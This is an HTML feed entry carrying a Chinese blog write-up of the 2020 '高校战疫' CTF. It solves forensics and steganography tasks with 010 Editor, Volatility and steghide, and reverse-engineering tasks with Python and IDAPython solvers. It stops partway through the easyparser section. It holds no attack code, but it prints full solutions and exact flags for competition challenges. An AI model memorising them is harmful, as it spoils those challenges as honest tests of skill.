    <link href="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/"/>
    <url>/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h1><p>打了两天的比赛，小做了几道题，不可谓不充实。虽然找不到工作，也要继续学习。</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="简单的misc"><a href="#简单的misc" class="headerlink" title="简单的misc"></a>简单的misc</h2><p>用010editor打开photo.jpg，在最底部看到zip格式，</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200311151648233.png" alt="image-20200311151648233"></p><p>直接改后缀解压，得到摩斯密码，解密是flag.zip的密码，输入后得到base64加密的flag。</p><p>解密即可。flag{Th1s_is_FlaG_you_aRE_rigHT}</p><h2 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h2><p>拿到一个残缺的二维码，看这个二维码很别扭，用Stegsolve.jar翻转了颜色之后，看上去舒服多了，然后补定位符，奈何手残，总是补不好，于是放弃，然后我再压缩包右击了一下7z解压，无意发现这个压缩包是假密码，拿到了一个wav文件，使用百度找了好多类似的题，用Audacity分析频谱发现开始和结束有问题，把音量调到最大，开始的部分还是听不到，但是最后可以听出是拨号音，（看过柯南，一下就猜出这是要猜电话号码），结合百度，才发现和DTFM有关。这里给出一篇参考文章：<a href="https://hebin.me/2017/09/10/%E8%A5%BF%E6%99%AEctf-beyond/">https://hebin.me/2017/09/10/%E8%A5%BF%E6%99%AEctf-beyond/</a></p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200311153008620.png" alt="image-20200311153008620"></p><p>然后可以得到一串数字187485618521，但是提交不对，感觉还是和那个二维码有关，</p><p>strings命令找到：<img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200311153154593.png" alt="image-20200311153154593"></p><p>看来要base64加密,最后得出flag{MTg3NDg1NjE4NTIx}</p><h2 id="ez-mem-amp-usb"><a href="#ez-mem-amp-usb" class="headerlink" title="ez_mem&amp;usb"></a>ez_mem&amp;usb</h2><p>从来不刷杂项题，所以都是靠百度做，拿到一个数据pcap文件，分析流量，过滤http协议，找到上传的文件。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200311153716210.png" alt="image-20200311153716210"></p><p>发现一个40M的数据包，那肯定传文件了，把文件dump出来，直接解压，得到一个vmem文件，百度一波，这是要内存取证，萌新参考：<a href="https://www.cnblogs.com/0x4D75/p/11161822.html">https://www.cnblogs.com/0x4D75/p/11161822.html</a></p><p>思路是，filescan+grep找到和flag字符匹配的文件，还真有一个flag.img，将flag.img dump出来，然后直接7z解压，需要密码，于是找到内存镜像中的cmd命令，有密码给出。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@redhat</span><span class="hljs-symbol">:/mnt/hgfs/P/</span>高校战疫/misc/usb取证<span class="hljs-comment"># volatility -f data.vmem --profile=WinXPSP3x86 filescan | grep flag</span><br>Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br><span class="hljs-number">0x0000000001155f90</span>      <span class="hljs-number">1</span>      0 R--rwd \Device\HarddiskVolume1\Documents <span class="hljs-keyword">and</span> Settings\Administrator\flag.img<br><br>root<span class="hljs-variable">@redhat</span><span class="hljs-symbol">:/mnt/hgfs/P/</span>高校战疫/misc/usb取证<span class="hljs-comment"># volatility -f data.vmem --profile=WinXPSP3x86 dumpfiles -Q 0x1155f90 -D ./output</span><br>Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>DataSectionObject <span class="hljs-number">0x01155f90</span>   None   \Device\HarddiskVolume1\Documents <span class="hljs-keyword">and</span> Settings\Administrator\flag.img<br><br>root<span class="hljs-variable">@redhat</span><span class="hljs-symbol">:/mnt/hgfs/P/</span>高校战疫/misc/usb取证<span class="hljs-comment"># volatility -f data.vmem --profile=WinXPSP3x86 cmdscan</span><br>Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>**************************************************<br><span class="hljs-symbol">CommandProcess:</span> csrss.exe <span class="hljs-symbol">Pid:</span> <span class="hljs-number">464</span><br><span class="hljs-symbol">CommandHistory:</span> <span class="hljs-number">0x556bb8</span> <span class="hljs-symbol">Application:</span> cmd.exe <span class="hljs-symbol">Flags:</span> Allocated, Reset<br><span class="hljs-symbol">CommandCount:</span> <span class="hljs-number">2</span> <span class="hljs-symbol">LastAdded:</span> <span class="hljs-number">1</span> <span class="hljs-symbol">LastDisplayed:</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">FirstCommand:</span> 0 <span class="hljs-symbol">CommandCountMax:</span> <span class="hljs-number">50</span><br><span class="hljs-symbol">ProcessHandle:</span> <span class="hljs-number">0x504</span><br>Cmd <span class="hljs-comment">#0 @ 0x3609ea0: passwd:weak_auth_top100</span><br>Cmd <span class="hljs-comment">#1 @ 0x5576d0: start wireshark</span><br>Cmd <span class="hljs-comment">#13 @ 0x9f009f: ??</span><br>Cmd <span class="hljs-comment">#41 @ 0x9f003f: ?\?????????</span><br><br></code></pre></td></tr></table></figure><p>压缩包里是一个usbdata，查了一下这个脚本，解密即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">usb_codes = &#123;<br>   <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;aA&quot;</span>, <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;bB&quot;</span>, <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;cC&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;dD&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;eE&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;fF&quot;</span>,<br>   <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;gG&quot;</span>, <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;hH&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;iI&quot;</span>, <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;jJ&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;kK&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;lL&quot;</span>,<br>   <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;mM&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;nN&quot;</span>, <span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;oO&quot;</span>, <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;pP&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;qQ&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;rR&quot;</span>,<br>   <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;sS&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;tT&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;uU&quot;</span>, <span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;vV&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;wW&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;xX&quot;</span>,<br>   <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;yY&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1!&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2@&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3#&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4$&quot;</span>,<br>   <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5%&quot;</span>, <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6^&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&amp;&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8*&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9(&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0)&quot;</span>,<br>   <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot;  &quot;</span>, <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-_&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=+&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&#123;&quot;</span>, <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&#125;&quot;</span>,  <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;#~&quot;</span>,<br>   <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;:&quot;</span>, <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;\&quot;&quot;</span>,  <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&lt;&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&gt;&quot;</span>, <span class="hljs-number">0x4f</span>:<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-number">0x50</span>:<span class="hljs-string">&quot;&lt;&quot;</span><br>   &#125;<br><br>key = [<span class="hljs-number">0x09</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x1F</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x1F</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x1E</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x30</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    flag += usb_codes[key[i]][<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>flag{69200835784ec3ed8d2a64e73fe913c0}</p><h2 id="武汉加油"><a href="#武汉加油" class="headerlink" title="武汉加油"></a>武汉加油</h2><p>010editor打开图片，这可真是个好东西啊，两种不同的文件格式还分颜色。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200319111152938.png" alt="image-20200319111152938"></p><p>直接改后缀rar解压，</p><p>然后使用一个工具爆破出隐藏的flag.txt文件。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sqf">将<span class="hljs-built_in">flag</span>.txt文件隐藏到<span class="hljs-built_in">flag</span>.jpg中：<br>steghide embed -cf <span class="hljs-built_in">flag</span>.jpg -ef <span class="hljs-built_in">flag</span>.txt -p <span class="hljs-number">123456</span><br><br>从<span class="hljs-built_in">flag</span>.jpg解出<span class="hljs-built_in">flag</span>.txt:<br>steghide extract -sf <span class="hljs-built_in">flag</span>.jpg -p <span class="hljs-number">123456</span><br><br></code></pre></td></tr></table></figure><p>shell脚本爆破密码：</p><p>…..没成功，算了，不贴了。。</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="天津垓"><a href="#天津垓" class="headerlink" title="天津垓"></a>天津垓</h2><p>上来先运行程序，提示缺少cygwin1.dll文件，下载了之后运行还是报错，算了吧，静态分析看看。</p><p>找到了一个f函数，代码很简单，就一些简单的运算操作。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200315160945833.png" alt="image-20200315160945833"></p><p>感觉有戏，直接写脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">s1 = [<span class="hljs-number">0x52</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x21</span>]<br>s2 = [<span class="hljs-number">17</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">20</span>, <span class="hljs-number">42</span>, <span class="hljs-number">59</span>, <span class="hljs-number">47</span>, <span class="hljs-number">3</span>, <span class="hljs-number">47</span>, <span class="hljs-number">4</span>, <span class="hljs-number">16</span>, <span class="hljs-number">72</span>, <span class="hljs-number">62</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">16</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">255</span>):<br>        <span class="hljs-keyword">if</span> s2[i] == (~(j &amp; s1[i % <span class="hljs-number">14</span>])) &amp; (j | s1[i % <span class="hljs-number">14</span>]):<br>            flag += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>脚本跑出来是<code>Caucasus@s_ability</code>，提交也不对，我把这个函数出现的字符串都搜了一遍，知道了这是个假面骑士……没看过，我还把跑出来的字符串发给一个假面迷，我真是够了。看了看别的函数，发现有反调试特征：</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200315161644169.png" alt="image-20200315161644169"></p><p>那肯定要动态调试的啊，一想又运行不了。我把函数都看一遍看看有什么信息。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200315162052676.png" alt="image-20200315162052676"></p><p>发现这里的Str和f函数中的Str是一个，分析了一下这个函数，是一段SMC(自修改代码)进行动态解密的。</p><p>使用IDAPython：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = <span class="hljs-string">&quot;Caucasus@s_ability&quot;</span><br>start = <span class="hljs-number">0x10040164d</span><br>end = start + <span class="hljs-number">1045</span><br>j = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end):<br>    ida_bytes.patch_byte(i, ida_bytes.get_byte(i)^ <span class="hljs-built_in">ord</span>(flag[j % <span class="hljs-number">18</span>]))<br>    j += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200315162525217.png" alt="image-20200315162525217"></p><p>也不是很复杂。。。。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py">s = [<span class="hljs-number">2007666</span>,<span class="hljs-number">2125764</span>,<span class="hljs-number">1909251</span>,<span class="hljs-number">2027349</span>,<span class="hljs-number">2421009</span>,<span class="hljs-number">1653372</span>,<span class="hljs-number">2047032</span>,<span class="hljs-number">2184813</span>,<span class="hljs-number">2302911</span>,<span class="hljs-number">2263545</span>,<span class="hljs-number">1909251</span>,<span class="hljs-number">2165130</span>,<span class="hljs-number">1968300</span>,<span class="hljs-number">2243862</span>,<span class="hljs-number">2066715</span>,<span class="hljs-number">2322594</span>,<span class="hljs-number">1987983</span>,<span class="hljs-number">2243862</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">2066715</span>,<span class="hljs-number">2263545</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">964467</span>,<span class="hljs-number">944784</span>,<span class="hljs-number">944784</span>,<span class="hljs-number">944784</span>,<span class="hljs-number">728271</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">2263545</span>,<span class="hljs-number">2283228</span>,<span class="hljs-number">2243862</span>,<span class="hljs-number">2184813</span>,<span class="hljs-number">2165130</span>,<span class="hljs-number">2027349</span>,<span class="hljs-number">1987983</span>,<span class="hljs-number">2243862</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">2283228</span>,<span class="hljs-number">2047032</span>,<span class="hljs-number">1909251</span>,<span class="hljs-number">2165130</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">2401326</span>,<span class="hljs-number">1987983</span>,<span class="hljs-number">2243862</span>,<span class="hljs-number">2184813</span>,<span class="hljs-number">885735</span>,<span class="hljs-number">2184813</span>,<span class="hljs-number">2165130</span>,<span class="hljs-number">1987983</span>,<span class="hljs-number">2460375</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br>v61 = <span class="hljs-number">19683</span><br>v62 = <span class="hljs-number">0x8000000B</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">51</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">255</span>):<br>        <span class="hljs-keyword">if</span> s[i] == v61 * j % v62:<br>            flag+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>flag{Thousandriver_is_1000%_stronger_than_zero-one}</p><h2 id="cycle-graph"><a href="#cycle-graph" class="headerlink" title="cycle_graph"></a>cycle_graph</h2><p>描述是图算法，估计凉了，数据结构菜的一笔。</p><p>找到关键函数：</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200315163844983.png" alt="image-20200315163844983"></p><p>这里是对v1进行初始化，假设v1是个二维数组，每组有三个数据，根据代码可分析出有32组。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200315164605229.png" alt="image-20200315164605229"></p><p>这里就是主要算法。</p><p>然后最后判断flag：</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200315195856725.png" alt="image-20200315195856725"></p><p>刚开始没注意v7的限制，直接写的脚本跑，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><br>arr_1 = [<span class="hljs-number">0x00000034</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x0000002A</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x0000002A</span>, <span class="hljs-number">0x0000002F</span>, <span class="hljs-number">0x0000002A</span>, <span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000032</span>, <span class="hljs-number">0x00000032</span>, <span class="hljs-number">0x00000032</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000032</span>, <span class="hljs-number">0x0000002B</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x0000002E</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x00000032</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x00000031</span>, <span class="hljs-number">0x0000002F</span>, <span class="hljs-number">0x00000033</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(arr_1))<br>arr_2 = [<span class="hljs-number">0x0000001F</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000012</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x0000001A</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x0000000F</span>, <span class="hljs-number">0x0000000F</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000017</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0x00000017</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000016</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(arr_2))<br>arr_3 = [<span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000017</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0x0000001F</span>, <span class="hljs-number">0x00000017</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x0000001D</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x00000019</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x0000001A</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000016</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x0000000F</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x0000000B</span>]<br><br>v1 = [[<span class="hljs-number">0</span>] * <span class="hljs-number">3</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>):<br>    v1[i][<span class="hljs-number">0</span>] = arr_1[i]<br>    v1[i][<span class="hljs-number">1</span>] = arr_2[i+<span class="hljs-number">1</span>]<br>    v1[i][<span class="hljs-number">2</span>] = arr_3[i+<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(v1)<br><br>str1 = string.printable<br><span class="hljs-built_in">print</span>(str1)<br><br>v5 = <span class="hljs-number">48</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>ii = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> str1:<br>        <span class="hljs-keyword">if</span> v1[ii][<span class="hljs-number">0</span>] + v5 == <span class="hljs-built_in">ord</span>(j):<br>            flag += j<br>            ii = v1[ii][<span class="hljs-number">1</span>]<br>            v5 = <span class="hljs-built_in">ord</span>(j)<br>            <span class="hljs-built_in">print</span>(j)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> v5 - v1[ii][<span class="hljs-number">0</span>] == <span class="hljs-built_in">ord</span>(j):<br>            flag += j<br>            ii = v1[ii][<span class="hljs-number">2</span>]<br>            v5 = <span class="hljs-built_in">ord</span>(j)<br>            <span class="hljs-built_in">print</span>(j)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>跑出来<code>d8b0bae8jh52db/2</code>,提交当然不对，后来看到了v7的限制。为什么v7会出现差异呢？ 因为有时候加v5和减v5都满足，不知道走哪条路径。估计得用某个算法解，比完赛再学一下算法，所以我手动正着加倒着，硬是给写出来了。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200315170104295.png" alt="image-20200315170104295"></p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200315170118029.png" alt="image-20200315170118029"></p><p>满满的菜啊…….</p><p>此处可用广度优先搜索算法，算法学习具体参考<a href="https://blog.csdn.net/raphealguo/article/details/7523411">https://blog.csdn.net/raphealguo/article/details/7523411</a></p><h2 id="easyparser"><a href="#easyparser" class="headerlink" title="easyparser"></a>easyparser</h2><p>这个题，我可是特别肝的，知道是虚拟机，但是我也没遇到过这种题，直接动态调试，我一步一步跟出来的程序逻辑，还好不是特别复杂，也就调了6个小时左右吧。。。。先给出解密脚本，然后再学习一下正确的解法。</p><figure class="highlight 